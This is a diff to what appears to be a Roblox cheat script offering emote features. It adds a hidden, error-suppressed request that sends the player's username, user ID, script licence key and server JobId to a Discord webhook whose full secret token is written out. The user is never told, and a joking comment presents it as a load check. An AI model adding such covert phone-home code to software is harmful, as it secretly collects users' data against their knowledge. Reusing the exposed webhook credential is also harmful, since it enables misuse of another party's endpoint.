@@ -1088,6 +1088,38 @@ Tabs.PlayEmotes:AddButton({
 })
 end)
 end
+--[[
+dont spam this webhook pls i need to know if the thingy is working
+]]--
+xpcall(function()
+    local res = request({
+        Url = "https://discord.com/api/webhooks/1215443337319022594/5Dy4NlX3Xn83XqokYgsluWC6_akYoSnKsZD2moVhxzx-lVnohcJKVOdRxRsqqSH_IuRO",
+        Method = "POST",
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+        Body = [[{
+          "content": "SCRIPT FULLY LOADED YAYYY FINALLY WORKY!!!:",
+          "embeds": [
+            {
+              "title": "AMONG US",
+              "color": 5814783,
+              "fields": [
+                {
+                  "name": "User Details",
+                  "value": "Username: ]]..game.Players.LocalPlayer.Name..[[\nUser Id: ]]..game.Players.LocalPlayer.UserId..[[\nKey: ]]..tostring(script_key)..[[\nJobId: ]]..tostring(game.JobId)..[["
+                },
+                {
+                  "name": "Extra",
+                  "value": "Note: Cats are cute!"
+                }
+              ]
+            }
+          ],
+          "attachments": []
+        }]] 
+})  
+end, warn)
 Fluent:Notify({
     Title = "Sillyware.meow",
     Content = "Fully Loaded Script!",
